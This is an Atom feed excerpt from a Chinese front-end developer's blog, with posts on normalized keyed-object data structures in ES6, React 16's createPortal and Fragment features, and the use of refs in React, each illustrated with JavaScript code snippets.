<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>冷暖我自知</title>
  
  <subtitle>这个前端有点菜。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/TheNightElf/"/>
  <updated>2018-05-04T03:34:18.043Z</updated>
  <id>https://github.com/TheNightElf/</id>
  
  <author>
    <name>冷暖我自知</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于数据结构的设计</title>
    <link href="https://github.com/TheNightElf/2018/03/04/%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E8%AE%BE%E8%AE%A1/"/>
    <id>https://github.com/TheNightElf/2018/03/04/关于数据结构的设计/</id>
    <published>2018-03-04T02:29:24.000Z</published>
    <updated>2018-05-04T03:34:18.043Z</updated>
    
    <content type="html"><![CDATA[<p>传统的数据设计中，大多都是以一种 <code>JSON</code> 的数据格式来设计的。我并不否认，<code>JSON</code> 是一种非常直观、方便的储存的方式，毕竟它的出现就是为了替代啰嗦的 <code>XML</code> 格式的。不过当 <code>ES6</code> 来临之后，你会发现 <code>JSON</code> 格式也会有些啰嗦。</p><a id="more"></a><h3 id="使用JSON来储存数据"><a href="#使用JSON来储存数据" class="headerlink" title="使用JSON来储存数据"></a>使用JSON来储存数据</h3><p>这里我们直接使用 <code>文章</code> 来举例。如果按照 <code>JSON</code> 来设计，应该是下面这个样子的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> articles = [&#123;</span><br><span class="line">    id: ,</span><br><span class="line">    read: ,</span><br><span class="line">    createdTime: ,</span><br><span class="line">    modifiedTime: ,</span><br><span class="line">    author: ,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><p>这是一个非常典型的 <code>JSON</code> 数据结构。它非常直观的表示了一个文章的集合。<br>下面我们看下如何对它进行 <code>增删改查</code> 的操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// push 并不是一个很好的追加方式，没有更改指针</span></span><br><span class="line">articles.push(&#123;</span><br><span class="line">    id: ,</span><br><span class="line">    read: ,</span><br><span class="line">    createdTime: ,</span><br><span class="line">    modifiedTime: ,</span><br><span class="line">    author: ,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// concat 是一种推荐的方式</span></span><br><span class="line">articles = articles.concat([&#123;</span><br><span class="line">    id: ,</span><br><span class="line">    read: ,</span><br><span class="line">    createdTime: ,</span><br><span class="line">    modifiedTime: ,</span><br><span class="line">    author: ,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// delete</span></span><br><span class="line">articles = articles.filter(<span class="function"><span class="params">v</span> =&gt;</span> v.id !== xxx.id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// update</span></span><br><span class="line">articles = articles.map(</span><br><span class="line">    v =&gt; (v.id === xxx.id ? <span class="built_in">Object</span>.assign(v, &#123;<span class="attr">xxx</span>: <span class="string">'xxx'</span>&#125;) : v)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get</span></span><br><span class="line"><span class="keyword">let</span> article;</span><br><span class="line">articles.forEach(<span class="function"><span class="params">v</span> =&gt;</span> v.id === xxx.id ? article = v : <span class="literal">null</span>)</span><br></pre></td></tr></table></figure><p>发现了吗？不管你要进行哪种操作，都需要遍历一遍才行。<br>如果是两个组数据相互关联的话，就需要遍历就需要嵌套了，估计每一个程序员都不想遇到这种情况。<br>下面我们来看一种 <code>Map</code> 的储存形式。</p><h3 id="使用Map来储存数据"><a href="#使用Map来储存数据" class="headerlink" title="使用Map来储存数据"></a>使用Map来储存数据</h3><p>还是用文章来举例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> articles = &#123;</span><br><span class="line">    [id]: &#123;</span><br><span class="line">        id: ,</span><br><span class="line">        read: ,</span><br><span class="line">        createdTime: ,</span><br><span class="line">        modifiedTime: ,</span><br><span class="line">        author: ,</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说的是 <code>Map</code> 其实不就是我们经常使用的 <code>Object</code> 吗？<br>对，它就是一种非常常见的 <code>Object</code> 只不过这个 <code>Object</code> 里面保存的很多的数据。<br>下面我们看下如何对它进行 <code>增删改查</code> 的操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add</span></span><br><span class="line"></span><br><span class="line">articles = <span class="built_in">Object</span>.assign(&#123;&#125;, articles, &#123;</span><br><span class="line">    [id]: &#123;</span><br><span class="line">        id: ,</span><br><span class="line">        read: ,</span><br><span class="line">        createdTime: ,</span><br><span class="line">        modifiedTime: ,</span><br><span class="line">        author: ,</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// delete</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> articles[id]</span><br><span class="line"></span><br><span class="line"><span class="comment">// update</span></span><br><span class="line"></span><br><span class="line">articles = <span class="built_in">Object</span>.assign(</span><br><span class="line">    &#123;&#125;,</span><br><span class="line">    &#123;articles&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        [id]: &#123;</span><br><span class="line">            ...articles[id],</span><br><span class="line">            xxx: <span class="string">'xx'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// get</span></span><br><span class="line"></span><br><span class="line">articles[id]</span><br></pre></td></tr></table></figure><p><code>WTF?</code> 对，你没有看错，一次遍历都没有！一次遍历都没有！一次遍历都没有！<br>而且我们在 <code>改删</code> 时候的操作是不是非常的简洁？关于更多类似于这种数据结构的设计你可以<a href="https://github.com/paularmstrong/normalizr">点击这里</a>。</p><h3 id="为什么现在才流行起来？"><a href="#为什么现在才流行起来？" class="headerlink" title="为什么现在才流行起来？"></a>为什么现在才流行起来？</h3><p>并不是说以前的人太笨了，而是在 <code>ES6</code> 普及之后，这种数据格式才真正开始兴起。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES6 常用 Object 操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 返回对象的键的数组</span></span><br><span class="line"><span class="built_in">Object</span>.keys(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 返回对象的值的数据</span></span><br><span class="line"><span class="built_in">Object</span>.values();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 合并多个对象并返回</span></span><br><span class="line"><span class="built_in">Object</span>.assign();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 返回对象的键值对的二维数组</span></span><br><span class="line"><span class="built_in">Object</span>.entries();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 常用 Array 操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 目标值是否是一个数组</span></span><br><span class="line"><span class="built_in">Array</span>.isArray();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 过滤数组</span></span><br><span class="line"><span class="built_in">Array</span>.filter();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 遍历数组</span></span><br><span class="line"><span class="built_in">Array</span>.map();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 缩减数组</span></span><br><span class="line"><span class="built_in">Array</span>.reduce();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 缩减数组，从右到左。</span></span><br><span class="line"><span class="built_in">Array</span>.reduceRight();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 遍历数组，找到符合的元素并返回</span></span><br><span class="line"><span class="built_in">Array</span>.find();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. 遍历数组，找到符合的元素并返回其索引</span></span><br><span class="line"><span class="built_in">Array</span>.findIndex();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. 排序数组</span></span><br><span class="line"><span class="built_in">Array</span>.sort();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 9. 数组是否包含某个元素</span></span><br><span class="line"><span class="built_in">Array</span>.includes();</span><br></pre></td></tr></table></figure><p>上面这些是工作中可能会频繁用到的，关于数组或对象的更多更多用法可以自行参阅<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">MDN-Array</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object" target="_blank" rel="noopener">MDN</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;传统的数据设计中，大多都是以一种 &lt;code&gt;JSON&lt;/code&gt; 的数据格式来设计的。我并不否认，&lt;code&gt;JSON&lt;/code&gt; 是一种非常直观、方便的储存的方式，毕竟它的出现就是为了替代啰嗦的 &lt;code&gt;XML&lt;/code&gt; 格式的。不过当 &lt;code&gt;ES6&lt;/code&gt; 来临之后，你会发现 &lt;code&gt;JSON&lt;/code&gt; 格式也会有些啰嗦。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>React16.0.0</title>
    <link href="https://github.com/TheNightElf/2017/10/02/React16.0.0/"/>
    <id>https://github.com/TheNightElf/2017/10/02/React16.0.0/</id>
    <published>2017-10-02T02:35:43.000Z</published>
    <updated>2018-03-26T03:48:38.722Z</updated>
    
    <content type="html"><![CDATA[<p><code>React</code>的版本从 <code>15.6.2</code> 升级到 <code>16.0.0</code> 不仅更改了 <code>License</code>，其内部也给我们提供了一些非常有实用性的特性，像 <code>createPortal</code>、<code>React.Fragment</code>等。<br><a id="more"></a></p><h3 id="为什么要有-createPortal？"><a href="#为什么要有-createPortal？" class="headerlink" title="为什么要有 createPortal？"></a>为什么要有 <code>createPortal</code>？</h3><p>React的数据流动是单向传递的，所以我们写的很多的React的组件中，DOM结构也是 <strong>一层套着一层</strong>。绝大多数的web网站都会有一个会被频繁使用的全局弹层，如果按照React中的DOM结构来写的话，那么只能被放在当前的组件内部使用。<code>createPortal</code>的出现帮我们解决了这个问题，你可以在任何地方使用它并且可以自己指定你的弹层出现的位置。</p><h3 id="createPortal介绍"><a href="#createPortal介绍" class="headerlink" title="createPortal介绍"></a>createPortal介绍</h3><p><code>createPortal</code>的使用非常简单，该方法只接受两个参数：</p><ul><li>一个是你要添加的DOM节点</li><li>一个是目标节点。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">createPortal(</span><br><span class="line">    dom,  <span class="comment">// 你要添加的DOM结构</span></span><br><span class="line">    targetDom  <span class="comment">// 放置该DOM结构的位置</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="自己实现一个全局提示"><a href="#自己实现一个全局提示" class="headerlink" title="自己实现一个全局提示"></a>自己实现一个全局提示</h3><p>模仿 <code>antd</code> 中 <code>message</code> 组件的用法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;render, createPortal&#125; <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;Icon&#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'./style.scss'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Message</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>(...arguments);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.node = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> &#123;during&#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(<span class="keyword">this</span>.node);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 弹层显示时间达到后移除</span></span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">document</span>.body.removeChild(<span class="keyword">this</span>.node);</span><br><span class="line">        </span><br><span class="line">        &#125;, during);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> &#123;type&#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> createPortal(</span><br><span class="line">            &lt;div className=&#123;<span class="string">`global-message global-message-<span class="subst">$&#123;type&#125;</span>`</span>&#125;&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    type === <span class="string">'success'</span> ? &lt;Icon type='check-circle'/&gt; :</span><br><span class="line">                        type === 'error' ? &lt;Icon type='exclamation-circle-o'/&gt; : null</span><br><span class="line">                &#125;</span><br><span class="line">                &#123;this.props.children&#125;</span><br><span class="line">            &lt;/div&gt;,</span><br><span class="line">            this.node</span><br><span class="line">        );</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentWillUnmount() &#123;</span><br><span class="line"></span><br><span class="line">        document.body.removeChild(this.node);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">    success: function (txt, during = 3000) &#123;</span><br><span class="line"></span><br><span class="line">        let far = document.createElement('div');</span><br><span class="line"></span><br><span class="line">        render(</span><br><span class="line">            &lt;Message during=&#123;during&#125; type='success'&gt;&#123;txt&#125;&lt;/Message&gt;,</span><br><span class="line">            far</span><br><span class="line">        );</span><br><span class="line">    </span><br><span class="line">    &#125;,</span><br><span class="line">    error: function (txt, during = 3000) &#123;</span><br><span class="line"></span><br><span class="line">        let far = document.createElement('div');</span><br><span class="line"></span><br><span class="line">        render(</span><br><span class="line">            &lt;Message during=&#123;during&#125; type='error'&gt;&#123;txt&#125;&lt;/Message&gt;,</span><br><span class="line">            far</span><br><span class="line">        );</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样我们就可以在任何组件内部调用 <code>Message</code> 组件了，它会为我们在全局的DOM结构上展示一个我们想要的DOM结构。</p><h3 id="顺便一提-–-React-Fragment"><a href="#顺便一提-–-React-Fragment" class="headerlink" title="顺便一提 – React.Fragment"></a>顺便一提 – <code>React.Fragment</code></h3><p>通俗的，你可以把它理解为 <code>document.fragment</code> 的 React版。它的出现意味着我们可以直接渲染两个并列的同级组件，而不是每次都要在他们外层套一个无用的 <code>div</code> 标签。</p><p><strong>错误写法：</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这种写法在React中是会报错的</span></span><br><span class="line">render () &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        &lt;li&gt;<span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">        &lt;li&gt;2&lt;/</span>li&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>正确写法：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">render () &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        &lt;React.Fragment&gt;</span><br><span class="line">            &lt;li&gt;<span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">            &lt;li&gt;2&lt;/</span>li&gt;</span><br><span class="line">        &lt;<span class="regexp">/React.Fragment&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="剩下的特性"><a href="#剩下的特性" class="headerlink" title="剩下的特性"></a>剩下的特性</h3><p><code>render</code> 方法不再只能渲染DOM结构了，现在你可以用它来渲染 <code>Array</code> &amp; <code>String</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">render () &#123;</span><br><span class="line">    <span class="comment">// return [1, 2, 3]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello world'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>componentDidCatch</code> 就不说了，它的用法很简单，想了解的可以去官方文档上找找。就写这么多吧，干活去了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;React&lt;/code&gt;的版本从 &lt;code&gt;15.6.2&lt;/code&gt; 升级到 &lt;code&gt;16.0.0&lt;/code&gt; 不仅更改了 &lt;code&gt;License&lt;/code&gt;，其内部也给我们提供了一些非常有实用性的特性，像 &lt;code&gt;createPortal&lt;/code&gt;、&lt;code&gt;React.Fragment&lt;/code&gt;等。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>React中的ref</title>
    <link href="https://github.com/TheNightElf/2017/06/20/React%E4%B8%AD%E7%9A%84ref/"/>
    <id>https://github.com/TheNightElf/2017/06/20/React中的ref/</id>
    <published>2017-06-20T03:25:06.000Z</published>
    <updated>2018-03-02T06:01:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>众所周知，<code>React</code> 是一个非常优秀的 <code>UI-Library</code>，它将我们<strong>从事件驱动</strong>带入了<strong>数据驱动</strong>的大潮中。在 <code>React</code> 中，一般通过修改 <code>state</code> 和 <code>props</code> 来更新组件。但是<strong>数据驱动</strong>并不意味着我们就完全不需要操作 <code>DOM</code> 了， <code>ref</code> 就是 <code>React</code> 为我们提供操作 <code>DOM</code> 的一个方法。<br><a id="more"></a></p><h4 id="什么时候该使用-ref"><a href="#什么时候该使用-ref" class="headerlink" title="什么时候该使用 ref ?"></a>什么时候该使用 <code>ref</code> ?</h4><blockquote><p>There are a few good use cases for refs:</p><ul><li>Managing focus, text selection, or media playback.</li><li>Triggering imperative animations.</li><li>Integrating with third-party DOM libraries.</li></ul></blockquote><p>官方给出的对于 <code>ref</code> 应该被使用的三种情况。</p><ol><li>需要操作 <code>input</code> 框的 <code>focus</code> 状态、文本的选中、媒体资源回放等。</li><li>触发必要的动画。</li><li>集成了第三方操作 <code>DOM</code> 的库。</li></ol><p>虽然给出了使用 <code>ref</code> 的场景，但是 <code>React</code> 还是非常不推荐使用 <code>ref</code> 的。</p><h4 id="ref是什么？"><a href="#ref是什么？" class="headerlink" title="ref是什么？"></a>ref是什么？</h4><p><code>ref</code> 取自英文单词 <code>reference</code>，意为<strong>引用</strong>。在 <code>React</code> 中， <code>ref</code> 表示对 <strong>组件/DOM</strong> 的真实引用而非在 <strong>虚拟DOM</strong> 中的引用。所以，在通过 <code>ref</code> 访问到的 <code>DOM结构</code> 和 <code>组件</code> 都是已经存在于页面上的。需要注意的是，这里所说的 <code>组件</code> 指的是 <strong>有状态的组件——可以被实例化</strong> 而非无状态的组件。引用组件后，可以通过该组件的实例访问其内部的 <code>state</code> &amp; <code>props</code> &amp; <code>method</code>。</p><h4 id="ref的使用"><a href="#ref的使用" class="headerlink" title="ref的使用"></a>ref的使用</h4><p>官方给出了两种 <code>ref</code> 的使用方式：</p><ul><li><p>回调函数(推荐)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    getInput = <span class="function">(<span class="params">ref</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 回调函数中的参数 `ref` 就是当前的真实 `DOM`。 </span></span><br><span class="line">        <span class="built_in">console</span>.log(ref)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.textInput = ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    focusInput = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.textInput.focus()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render () &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;button onClick=&#123;<span class="keyword">this</span>.focusInput&#125;&gt;click&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">                &#123;/</span>*&lt;input ref=&#123;this.getInput()&#125;/&gt;*/&#125;</span><br><span class="line">                &lt;input ref=&#123;ref =&gt; this.textInput = ref&#125;/&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <strong>使用回调函数的触发时机</strong></p><ul><li>组件被渲染后，回调参数 <code>ref</code> 为input的dom对象</li><li>组件被卸载后，回调参数 <code>ref</code> 为null，确保内存不被泄露</li><li><code>ref</code> 被改变</li></ul></li><li><p>使用字符串</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    focusInput = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.refs.textInput.focus()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render () &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;button onClick=&#123;<span class="keyword">this</span>.focusInput&#125;&gt;click&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">                &lt;input ref='textInput'/</span>&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        )</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>使用字符串时，通过 <code>this.refs</code> 访问dom或者组件实例。</p><h4 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h4><p>最后，还是要引用官方说的一句话：</p><blockquote><p><strong> Don’t Overuse Refs </strong></p></blockquote><p>既然我们选择了使用 <code>React</code> 我们就要习惯于使用数据来驱动组件更新，如果还是频繁的使用DOM操作，那和使用 <code>jQuery</code> 有什么区别呢？</p>]]></content>
    
    <summary type="html">
    
